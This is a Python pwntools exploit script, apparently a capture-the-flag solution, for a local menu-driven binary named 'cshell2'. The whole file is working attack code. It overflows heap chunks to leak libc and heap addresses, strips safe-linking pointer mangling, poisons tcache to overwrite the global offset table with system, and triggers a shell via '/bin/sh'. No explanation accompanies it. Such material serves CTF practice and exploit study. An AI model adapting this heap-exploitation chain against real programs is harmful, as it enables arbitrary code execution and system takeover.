from pwn import *
import time


libc = ELF('./libc.so.6',checksec=False)
elf  = ELF("./cshell2",checksec=False)
p = process(elf.path)
context.terminal = ["xfce4-terminal", "-e"]

HEAP_LEAK = 0
L_PADDING = 997
H_PADDING = 981

def p_recvs(times):
    for i in range(times):
        p.recvline()


def add(index,csize,first,middl,lastn,age,bio):
    time.sleep(0.1)
    p.sendlineafter(b"\n", b"1")
    p.sendlineafter(b": ", index)
    p.sendlineafter(b": ", csize)
    p.sendlineafter(b": ", first)
    p.sendlineafter(b": ", middl)
    p.sendlineafter(b": ", lastn)
    p.sendlineafter(b": ", age)
    p.sendlineafter(b": ", bio)

def add_clear(index,csize,first,middl,lastn,age,bio):
    time.sleep(0.1)
    p.sendlineafter(b"\n", b"1")
    p.sendlineafter(b": ", index)
    p.sendlineafter(b": ", csize)
    p.sendafter(b": ", first)
    p.sendafter(b": ", middl)
    p.sendafter(b": ", lastn)
    p.sendlineafter(b": ", age)
    p.sendafter(b": ", bio)


def edit(index,first,middl,lastn,age,bio):
    p.sendlineafter(b"\n", b"4")
    p.sendlineafter(b": ", index)
    p.sendlineafter(b": ", first)
    p.sendlineafter(b": ", middl)
    p.sendlineafter(b": ", lastn)
    p.sendlineafter(b": ", age)
    p.sendafter(b")", bio)

def delete(index):
    p.sendlineafter(b"\n", b"3")
    p.sendlineafter(b": ", index)

def show(index):
    p.sendlineafter(b"\n", b"2")
    p.sendlineafter(b": ", index)

def reage(index,age):
    p.sendlineafter(b"\n", b"5")
    p.sendlineafter(b": ", index)
    p.sendlineafter(b": ", age)

def show_libc_leak(idx):
    LIBC_A1_OFFSET = 0x1c2000 
    LIBC_CK_OFFPDN = 0x5cc0
    
    time.sleep(0.5)
    p.sendlineafter(b"\n", b"2")
    p.sendlineafter(b": ", idx)
    p_recvs(6)
    data = p.recvline()
    leak = u64((data[L_PADDING:L_PADDING + 6]).ljust(8, b'\x00'))
    libc.address = (leak - LIBC_A1_OFFSET) - LIBC_CK_OFFPDN
    log.info("LIBC LEAK "+hex(leak))
    log.info("LIBC ADDR "+hex(libc.address))
    time.sleep(0.5)

    return leak

def show_heap_leak(idx):
    time.sleep(0.5)
    p.sendlineafter(b"\n", b"2")
    p.sendlineafter(b"index: ", idx)
    p_recvs(9)
    data = p.recvline()

    HEAP_LEAK = u64(data[H_PADDING:-6].ljust(8, b'\x00'))
    deobfuscated = (HEAP_LEAK >> 12) ^ HEAP_LEAK
    deobfuscated = (deobfuscated >> 24) ^ deobfuscated
    heap_base = deobfuscated & 0xfffffffff000

    log.info("HEAP ADDR "+ hex(HEAP_LEAK))
    log.info("DEOBF ADDR "+ hex(deobfuscated))
    log.info("HEAP BASE ADDR "+hex(heap_base))
    return deobfuscated

def show_stack_leak(idx):
    time.sleep(1)
    p.sendlineafter(b"\n",b"2")
    p.sendlineafter(b"index: ",idx)
    p_recvs(2)
    time.sleep(0.5)
    data = p.recvline()
    leak = u64(data[15:-25].ljust(8, b'\x00'))
    return leak

gs = '''
set max-visualize-chunk-size 0x500
break * 
continue

'''

gdb.attach(p,gdbscript=gs)
time.sleep(1)

# libc leak
add(b"0", b"1040", b"data", b"data", b"data", b"4444", b"data")
add(b"1", b"1040", b"data", b"data", b"data", b"4444", b"data")
add(b"2", b"1032", b"data", b"data", b"data", b"4444", b"data")
time.sleep(0.5)

delete(b"1")
time.sleep(0.5)
delete(b"2")

edit(b"0", b"data", b"data", b"data", b"4444", b"A" * (1040 - (64 - 16))) 
time.sleep(0.5)
restore = show_libc_leak(b"0")

edit(b"0", b"data", b"data", b"data", b"4444", b"Y" * (1040 - (64 + 8)) + p64(0) + p64(0) + p64(0x421) + p64(restore))
delete(b"0")
log.info("Chunk recycled.")

# heap leak
time.sleep(0.5)
log.info("Starting second time of chunk allocation...")
add(b"0", b"1032", b"data", b"data", b"data", b"4444", b"data")
add(b"1", b"1032", b"data", b"data", b"data", b"4444", b"data")
add(b"2", b"1032", b"data", b"data", b"data", b"4444", b"data")
add(b"3", b"1032", b"data", b"data", b"data", b"4444", b"data")

log.info("Freeing chunks 3 and 2 [0,1 in use]...")
delete(b"3")
delete(b"2")
edit(b"1", b"a", b"a", b"a", b"444", b"B" * (1032 - (64-8)))
time.sleep(0.5)

# HEAP LEAK
HEAP_OFFSET = 0x710
GLOBAL_CHUNK_TABLE_POINTER = 0x404140
GLOBAL_CHUNK_TABLE_POINTER = 0x404100
GOT_TABLE = 0x404010
key = show_heap_leak(b"1")
key = key - HEAP_OFFSET
target = (key >> 12) ^ GOT_TABLE

# ABW
log.info("TARGET "+str(hex(key)))
time.sleep(0.5)
edit(b"1", b"/bin/sh", b"data", b"data", b"444", b"T" * (1032 - (64 - 8)) + p64(target))
add(b"2", b"1032", b"data", b"data", b"data", b"10", b"data")
add_clear(b"3", b"1032", p64(0x6666666666666666),
          p64(libc.sym["system"]),
          p64(libc.sym["puts"]), 
          b"10", 
          p64(libc.sym["scanf"]))
time.sleep(1)
delete(b"1")

p.interactive()

